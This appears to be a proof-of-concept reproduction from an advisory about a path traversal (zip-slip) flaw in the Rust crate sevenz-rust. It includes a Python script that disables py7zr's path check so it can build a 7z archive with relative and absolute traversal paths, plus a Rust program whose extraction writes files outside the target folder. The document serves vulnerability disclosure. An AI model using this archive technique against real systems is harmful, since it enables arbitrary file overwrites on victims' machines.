...
1. Build an archive using the following python script.
```python
import py7zr
import io
py7zr.py7zr.check_archive_path = lambda path: True
with py7zr.SevenZipFile('slip.7z', 'w') as archive:
    archive.writef(io.BytesIO(b'Relative Path Traversal'), 
        "..\\relative.txt")
    archive.writef(io.BytesIO(b'Absolute Path Traversal'), 
            "C:\\Temp\\absolute.txt")
    archive.writef(io.BytesIO(b'Normal File'), 
                "normal.txt")
```
2. Build the rust program with `sevenz-rust` as a dependency.
```rust
fn main() {
    sevenz_rust::decompress_file("slip.7z", "sample").expect("complete");
}
```
3. Run the rust program in the same directory as the archive.
4. View `sample/normal.txt`, `relative.txt` adjacent to `sample`, and `C:/Temp/absolute.txt` which will be now written to disk.
